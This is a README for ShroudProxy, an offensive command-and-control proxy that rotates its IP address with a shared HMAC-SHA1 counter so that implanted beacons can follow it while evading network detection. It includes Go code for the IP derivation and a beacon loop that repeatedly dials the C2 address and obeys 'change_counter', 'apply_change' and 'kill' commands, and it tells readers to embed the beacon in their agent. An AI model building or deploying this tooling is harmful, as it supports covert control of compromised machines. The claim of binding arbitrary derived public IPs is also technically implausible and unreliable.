# ShroudProxy

ShroudProxy is a dynamic proxy server designed for obfuscating attack vectors by frequently changing the proxy server's IP address. This tool assigns IP addresses dynamically using an HMAC-based algorithm with a counter to ensure that both the server and its connected beacons always synchronize IP addresses. The beacons share the same key material as the server, allowing them to automatically adjust and reconnect whenever the server's IP changes.

## Features

- **Dynamic IP Address Assignment**: The server dynamically generates IP addresses using an HMAC algorithm with a counter to obscure traffic patterns.
- **Beacon Synchronization**: Beacons are pre-configured with the same key material as the server, allowing them to detect and adjust to new IP addresses without manual intervention.
- **Obfuscation Mechanism**: The ability to cycle through IP addresses helps reduce the likelihood of network detection and interception.
- **Command and Control (C2)**: ShroudProxy can be used as a tunnel for a command and control server, allowing for communication while frequently changing the IP for increased stealth.

## How IP Address Generation Works

ShroudProxy uses an HMAC-SHA1 algorithm combined with a session-specific counter to generate the dynamic IP address. The server and beacons share a secret key composed of different parts, which is XOR-encrypted to enhance security. Both the server and the beacons use the same counter to remain synchronized.

### Key Components

1. **Secret Key**: A shared secret key (composed of parts `a`, `b`, `c`, etc.) is dynamically built and XOR-encrypted using a pair of predefined keys.
2. **Counter**: A counter value is used as a seed to produce new IP addresses. The counter can be incremented by the server, and the beacons follow suit upon receiving the command.
3. **HMAC Algorithm**: The counter is hashed using the HMAC-SHA1 algorithm and the secret key to produce a deterministic but unpredictable sequence of IP addresses.
4. **Multicast Range Avoidance**: The algorithm avoids generating IP addresses in the multicast range (224.0.0.0/4) to ensure proper functionality on standard network infrastructure.

### IP Generation Algorithm

1. The server generates a dynamic IP using the shared secret and a counter.
2. This IP is based on a hashing process (HMAC-SHA1) over the counter using the shared secret key.
3. The generated IP is validated to ensure it does not fall into a reserved or multicast range. If it does, the counter is incremented and a new IP is generated.
4. Once a valid IP is generated, the server binds this IP to a specific network interface.

The beacon follows the same process, using the same key and counter, to derive the new IP and reconnect to the proxy server.

### Example of IP Generation Code

```go
func GenerateFullIP(secret []byte, counter uint64) string {
    counterBytes := make([]byte, 8)
    binary.BigEndian.PutUint64(counterBytes, counter)

    hash := hmac.New(sha1.New, secret)
    hash.Write(counterBytes)
    hmacResult := hash.Sum(nil)

    ipSegment1 := int(hmacResult[0]%254) + 1
    ipSegment2 := int(hmacResult[1]%254) + 1
    ipSegment3 := int(hmacResult[2]%254) + 1
    ipSegment4 := int(hmacResult[3]%254) + 1

    generatedIP := fmt.Sprintf("%d.%d.%d.%d", ipSegment1, ipSegment2, ipSegment3, ipSegment4)

    if ipSegment1 >= 224 && ipSegment1 <= 239 {
        return GenerateFullIP(secret, counter+1)
    }

    return generatedIP
}
```

## Beacon Operations

The beacon continuously attempts to connect to the proxy server. Whenever the server changes its IP, the beacon updates its connection using the same counter and key material, ensuring that it reconnects automatically. This process happens silently and ensures continuous communication between the beacon and the proxy server.

### Beacon Example

```go
func StartBeacon() {
	counter := getSessionCounter()
	secret := GetSecret()

	for {
		generatedIP := GenerateFullIP(secret, counter)
		conn, err := net.Dial("tcp", generatedIP+":8080")
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		defer conn.Close()

		reader := bufio.NewReader(conn)
		for {
			message, err := reader.ReadString('\n')
			if err != nil {
				break
			}

			switch strings.TrimSpace(message) {
			case "change_counter":
				counter = changeCounter(counter)
			case "apply_change":
				time.Sleep(15 * time.Second)
				goto reconnect
			case "kill":
				return
			}
		}
	reconnect:
		time.Sleep(5 * time.Second)
	}
}
```
#### Start the server with
``` go run main.go ```

#### include the beacon in your agent and execute to complete the listener.
or run with ``` go run beacon/beacon.go ```